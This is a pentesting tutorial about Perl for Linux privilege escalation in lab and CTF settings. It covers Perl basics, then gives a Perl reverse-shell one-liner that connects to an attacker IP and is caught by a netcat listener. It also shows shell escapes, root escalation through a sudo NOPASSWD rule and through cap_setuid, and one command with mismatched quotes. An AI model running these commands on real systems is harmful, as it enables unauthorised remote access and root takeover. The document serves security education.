<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Linux for Pentester: Perl Privilege Escalation</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-for-pentester-perl-privilege-escalation/" rel="bookmark"><time class="entry-date published" datetime="2019-11-26T16:29:36+00:00">November 26, 2019</time><time class="updated" datetime="2025-06-07T10:33:08+00:00">June 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">Here we are again, coming back with one of the very essential commands, i.e., “Perl”. As we know, Perl has its significance in the era of programming languages specially designed for text editing. Apart from all of this, now it is also very prominent for a variety of purposes, including Linux system administration, network programming, web development, etc. So, keeping this fact in our mind, we will proceed to this article on how we can take more advantage of this command in the operation of Privilege Escalation.</span></p>
<p class="ai-optimize-7"><span style="color: #000000;"><strong><em>NOTE: “The main objective of publishing the series of ‘Linux for pentester’ is to introduce the circumstances and any kind of hurdles that can be faced by any pentester while solving CTF challenges or OSCP labs, which are based on Linux privilege escalations. Here we do not criticize any kind of misconfiguration that a network or system administrator does for providing higher permissions on any programs/binaries/files &amp; etc.” </em></strong></span></p>
<h3 class="ai-optimize-8"><span style="color: #800000;">Table of Contents</span></h3>
<p class="ai-optimize-9"><span style="color: #000000;"><strong>Overview of Perl             </strong></span></p>
<ul>
<li class="ai-optimize-10"><span style="color: #000000;">Introduction: What is Perl?</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">Where we use Perl?</span></li>
<li class="ai-optimize-12"><span style="color: #000000;">What is it’s necessities?</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">Multiple operations using Perl.</span></li>
</ul>
<p class="ai-optimize-14"><span style="color: #000000;"><strong>Abusing Perl</strong></span></p>
<ul>
<li class="ai-optimize-15"><span style="color: #000000;">SUDO Lab setups for privilege Escalation</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">Exploiting SUDO</span></li>
<li class="ai-optimize-17"><span style="color: #000000;">Capabilities</span></li>
</ul>
<h3 class="ai-optimize-18"><span style="color: #800000;">What is Perl?</span></h3>
<p class="ai-optimize-19"><span style="color: #000000;">Perl<strong> </strong>is a programming language that stands for <strong>“Practical Extraction and Reporting Language”.  </strong>It was created by <strong>Larry Wall</strong> in 1987 which is specially designed for text editing purpose.  As we all know computers understand only binary language i.e “0,1” or one can say low-level language, which is very difficult for humans to program in a binary language. So to overcome that difficulty we were needed a programming language which uses natural language elements, words that are used in common English language that can be easily understand by humans [<strong>high-level language</strong>].</span></p>
<p class="ai-optimize-20"><span style="color: #000000;">So once a program is coded by a human, it needs to be converted into the form that a computer understands. For that, we need something which can translate the high-level language to low-level language. Here interpreter comes to our help which is a software that converts the program written in the high-level language to low-level language for the computer to understand and execute the instructions written in the program. Hence, Perl is an <strong>interpreted programming language</strong>.</span></p>
<p class="ai-optimize-21"><span style="color: #000000;">It was originally a language optimized for scanning arbitrary <a style="color: #000000;" href="https://www.computerhope.com/jargon/t/textfile.htm">text files</a>, extracting information from those text files, and printing reports based on that information.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-rJdIOJsRmss/Xd1LE-ILwlI/AAAAAAAAhnY/c7ZJJOR2EAg6wkduUnu82dqPV_X-U70jwCLcBGAsYHQ/s1600/0.png"/></p>
<h3 class="ai-optimize-22"><span style="color: #800000;">Where do we use Perl?</span></h3>
<p class="ai-optimize-23"><span style="color: #000000;">The influence of Perl can be applied in many fields and the most popular use of Perl is in Web development. As we know that the major role and purpose of Perl is for text editing and extracting data and generating reports. Perl has become a popular language used in web development, networking and bioinformatics too. Apart from all this, Perl can also be used for CGI programming.</span></p>
<h3 class="ai-optimize-24"><span style="color: #800000;">What are its necessities?</span></h3>
<p class="ai-optimize-25"><span style="color: #000000;">As we all know, many programming languages can be used to do all the stuff that can be achieved with the help of Perl.</span></p>
<p class="ai-optimize-26"><span style="color: #000000;">So here is the question that arises: why should we specifically use “Perl”? <strong>Perl is very easy to learn</strong>, particularly if you have a background in computer programming. It is extremely portable, which can run on any operating system that has Perl interpreter installed, so it is platform-independent. All Linux Operating Systems come installed with Perl, so you can start Perl coding in Linux out of the box.</span></p>
<p class="ai-optimize-27"><span style="color: #000000;">Like another language, Perl is faster and more powerful in performing many tasks. It has many shortcuts that enable users to write quick scripts. Developers specifically designed it for text processing. Its built-in text processing ability makes Perl a widely used server-side programming language.</span></p>
<p class="ai-optimize-28"><span style="color: #000000;">So, on moving ahead in achieving our goal of Privilege Escalation varies first we will check for its version. For this purpose, we will use the <strong>“-v”</strong> option as shown below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">perl -v</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-weilWA0Mj_M/Xd1LFCYFTdI/AAAAAAAAhng/Ttme4U8G0H0T91X9fBQga_2Y-5sboHWzQCLcBGAsYHQ/s1600/1.png"/></p>
<p class="ai-optimize-29"><span style="color: #000000;">To know more about all those operations that a Perl can do we will use its help command, which will direct us for other functionality.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">perl -h</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-qX1xsSp_0NI/Xd1LHX2X5cI/AAAAAAAAhn0/OXhpiWp32fcUeNzgNpfrnhYVMUt-UsCNgCLcBGAsYHQ/s1600/2.png"/></p>
<h3 class="ai-optimize-30"><span style="color: #800000;">Multiple operations of Perl</span></h3>
<h5 class="ai-optimize-31"><span style="color: #000000;"><strong><u>Help in scripting:</u></strong> </span></h5>
<p class="ai-optimize-31"><span style="color: #000000;">As we know, unlike other programs written in languages such as C and C++, Perl programs do not need compilation for execution; they simply interpret and execute the Perl programs. We often use the term script for such interpreted programs written in a shell’s programming language or Perl.</span></p>
<p class="ai-optimize-32"><span style="color: #000000;">For example, as per the below image you can see I’ve created a file “script.pl” in which I have stored some lines of codes or can say have created a small script <em>(one can use it in creating any script as per requirements)</em> that need to execute program over the screen. So, to view your script, use the command as below:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat script.pl
perl script.pl</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-K2DQnN0t6bo/Xd1LHWqAXcI/AAAAAAAAhn4/_lSPOqoX_g8iyCPeh7aIPiqAnefwAqiZwCLcBGAsYHQ/s1600/3.png"/></p>
<h5 class="ai-optimize-33"><span style="color: #000000;"><strong><u>Help to execute code on the command line:</u></strong> </span></h5>
<p class="ai-optimize-33"><span style="color: #000000;">You can use this to run a piece of Perl code without creating a file. Due to differences between the Unix/Linux shell and the MS Windows Command prompt, we need to use different quotes around our code.</span></p>
<p class="ai-optimize-34"><span style="color: #000000;">Here in the screenshot below, I’m running a piece of code which is “Welcome to Ignite Technologies” by using <strong>“-e”</strong> argument to execute the same.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">perl -e 'print qq{Welcome to Ignite Technologies\n}'</pre>
<p class="ai-optimize-35"><span style="color: #000000;"><strong><em>Note: </em></strong><em>In simple words, one can say that this option “-e” executes or prints one line of code</em>.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-pB8gu3sWIB4/Xd1LH24VK4I/AAAAAAAAhn8/CxKx6BQzhb4BLnTpWh9bC1rKJO9dLITogCLcBGAsYHQ/s1600/4.png"/></p>
<h5 class="ai-optimize-36"><span style="color: #000000;"><strong><u>Help in restricted shell environment:</u></strong> </span></h5>
<p class="ai-optimize-36"><span style="color: #000000;">A user can use -e option to break out from restricted environments by spawning an interactive system shell, and it plays an special role in privilege escalation. With the help of this, we can also run any command in a restricted environment. Suppose in our case here I’m using this option to run tail command for displaying last few lines of /etc/passwd file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">perl -e 'exec "/bin/sh";'
perl -e 'exec "tail /etc/passwd";'</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-IvKqevv6afg/Xd1LIpyZeII/AAAAAAAAhoA/Gb1vUXVsK1Q59BobkNRsfyih5fDPewJUACLcBGAsYHQ/s1600/5.png"/></p>
<h5 class="ai-optimize-37"><span style="color: #000000;"><strong><u>Help to wrap the code in while loop:</u></strong>  </span></h5>
<p class="ai-optimize-37"><span style="color: #000000;">If we wish to wrap our code inside the loop that depends on certain conditions within a code defined by Perl, we will use the “-n” option for that case.</span></p>
<p class="ai-optimize-38"><span style="color: #000000;">For example, in the below image, you can see that I have a file named “Infosec.txt” and here, instead of displaying the whole content, I just want to print those lines that fulfill the condition.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat Infosec.txt
perl -n -E 'say if /Testing/' Infosec.txt</pre>
<p class="ai-optimize-39"><span style="color: #000000;">On framing above command Perl will check to each line of file Infosec.txt and will print all those lines that contain our search word i.e, Testing.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-XN7gZgVM8HA/Xd1LIs4dzNI/AAAAAAAAhoE/B049rOU0GhktJKG5Qw4YCsKrsoKASZnlACLcBGAsYHQ/s1600/6.png"/></p>
<h5 class="ai-optimize-40"><span style="color: #000000;"><strong><u>Help to edit file content:</u></strong> </span></h5>
<p class="ai-optimize-40"><span style="color: #000000;">Perl command also is used in editing any file content. For executing the same we will use “-i” argument, which will open files one by one and replaces the content with STDOUT.</span></p>
<p class="ai-optimize-41"><span style="color: #000000;">As you can see in below image I’ve used this option to convert the content of file Infosec.txt in upper case.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">perl -pi -e "tr /[a-Z]/[A-Z]/" Infosec.txt
head -7 Infosec.txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-_Trv9t_v_C4/Xd1LI8AYfDI/AAAAAAAAhoI/KmAVwlBWz5kir4BP6GdZmXdgySLReonFQCLcBGAsYHQ/s1600/7.png"/></p>
<p class="ai-optimize-42"><span style="color: #000000;">The most common use of “-p” together with the “-i” option also helps to provide “in-place editing”. Which means that instead of printing to the screen, our one-liner will write all the output back to the same file from which we took it. Here we are using this to replace a word with another word.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">perl -i -p -E 's/IGNITE/Egnite/' Infosec.txt
head -7 Infosec.txt</pre>
<p class="ai-optimize-43"><span style="color: #000000;">On framing the above command, your Perl will replace the word “IGNITE” with “Egnite” in the file Infosec.txt</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-FPnAvu8TfiM/Xd1LJ2PJ36I/AAAAAAAAhoM/mtvIX4XSXcwS3I3JVPkor4bJBSnPrDHoQCLcBGAsYHQ/s1600/8.png"/></p>
<h5 class="ai-optimize-44"><span style="color: #000000;"><strong><u>Perl in reverse shell:</u></strong> </span></h5>
<p class="ai-optimize-44"><span style="color: #000000;">We all knows that reverse shell is a type of shell in which the target machine interconnects to the attacking machine and the attacking machine has a listener port on which it receives the connection.</span></p>
<p class="ai-optimize-45"><span style="color: #000000;">So, here we are using Perl command which will send back a reverse shell to a listening attacker that will open remote network access.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">perl -e 'use Socket;$i="192.168.29.157";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-0feCFltpDZA/Xd1LKe-qW4I/AAAAAAAAhoQ/zRf0cIAFaqckIYot6iDaFrrpNDlFCf_IQCLcBGAsYHQ/s1600/9.png"/></p>
<p class="ai-optimize-46"><span style="color: #000000;">On framing above command run nc -lvp 1234 on the attacker box to receive the shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234
id
whoami</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-R5WlZlPNcwk/Xd1LE8tlIOI/AAAAAAAAhnc/dZChiVsMAp43sGWgZZ6X71oP3b0mbD4xQCLcBGAsYHQ/s1600/10.png"/></p>
<h3 class="ai-optimize-47"><span style="color: #800000;"><u>Abusing Perl</u></span></h3>
<h3 class="ai-optimize-48"><span style="color: #800000;">Sudo Rights Lab setups for Privilege Escalation</span></h3>
<p class="ai-optimize-49"><span style="color: #000000;">Above all, we have covered the main objectives that a Perl can perform but now we will move ahead in the task of privilege escalation. So to grab this first, we have to set up our lab of Perl command with administrative rights. After that, we will check for the Perl command and what impression it has after getting sudo rights and how we can use it more for privilege escalation.</span></p>
<p class="ai-optimize-50"><span style="color: #000000;">From the image below, it is clear that I created a local user (demo) who owns all sudo rights as root and can perform all tasks as admin.</span></p>
<p class="ai-optimize-51"><span style="color: #000000;">To add sudo right, open etc/sudoers file and type the following as a user Privilege specification.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">demo All=(ALL) NOPASSWD: /usr/bin/perl</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-5i3QN6u-GNs/Xd1LF1pIRMI/AAAAAAAAhnk/qONvL1wJb8wEx3hadF3-qUMO60TC_yjWACLcBGAsYHQ/s1600/11.png"/></p>
<h3 class="ai-optimize-52"><span style="color: #800000;">Exploiting Sudo rights</span></h3>
<p class="ai-optimize-53"><span style="color: #000000;">On adding user “demo” to etc/sudoers file, now we will start exploiting Perl facility by taking the privilege of sudoer’s permission. For this very first we must have sessions of a victim’s machine then only we can execute this task. Suppose we got the sessions of the victim’s machine that will assist us to have local user access of the targeted system through which we can escalate the root user rights.</span></p>
<p class="ai-optimize-54"><span style="color: #000000;">So now we will connect to the target machine with ssh, therefore, type following command to get access through local user login.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh demo@192.168.29.137</pre>
<p class="ai-optimize-55"><span style="color: #000000;">Then we look for sudo right of “demo” user (if given) and found that user “demo” can execute the Perl command as “root” without a password.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">whoami
sudo -l
sudo perl -e exec "/bin/bash";'
whoami</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-ej9UmE2Bno0/Xd1LGUv79UI/AAAAAAAAhno/mkzeKSGLgSIKQLlwED9z8OlNDIVAWVq8gCLcBGAsYHQ/s1600/12.png"/></p>
<h3 class="ai-optimize-56"><span style="color: #800000;">Capabilities in Privilege Escalation</span></h3>
<p class="ai-optimize-57"><span style="color: #000000;">As we know, whenever any user sets a sticky bit on a file, every privileged and unprivileged user can easily access those files. But if we want to share or restrict access to those files for security purposes, with only a limited/single user. We can simply use capabilities to acquire this operation. </span></p>
<p class="ai-optimize-58"><span style="color: #000000;">Capabilities are those permissions that divide the privileges of kernel users or kernel-level programs into small pieces. So that they allow a process sufficient power to perform specific privileged tasks.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">which perl
cp $(which perl) /home/demo
setcap cap_setuid+ep /home/demo/perl</pre>
<p class="ai-optimize-59"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-1cthYYvHs_0/Xd1LGtssGSI/AAAAAAAAhns/wJHpB6xRa28t_Ttr3YyCNjokzXG9zZvFgCLcBGAsYHQ/s1600/13.png"/></strong></span></p>
<p class="ai-optimize-60"><span style="color: #000000;">The below image shows that user “demo” can easily execute “perl” as root, and hence we accomplished our mission of privilege escalation using Perl.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
id</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-z6d_Knx3T28/Xd1LG2btaiI/AAAAAAAAhnw/s_CrRCVybYI5E8w7yYZ0uTjB-CCLY_6IACLcBGAsYHQ/s1600/14.png"/></p>
<p class="ai-optimize-61"><span style="color: #000000;"><strong><em>Conclusion: </em></strong><em>This article primarily influences readers to use the “Perl” command for privilege escalation. This is why we have just covered the basic operation that this command can achieve</em>.</span></p>
<p class="ai-optimize-6"><span style="color: #000000;">To Learn more about Privilege Escalation. Follow this</span> <a href="https://www.hackingarticles.in/category/privilege-escalation/">Link.</a></p>
<p class="ai-optimize-62"><span style="color: #000000;"><strong>Author</strong>: Komal Singh is a Cyber Security Researcher and Technical Content Writer. She is a completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contact</span> <a href="https://www.linkedin.com/in/komal-rajput-26b783131/"><strong>Here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
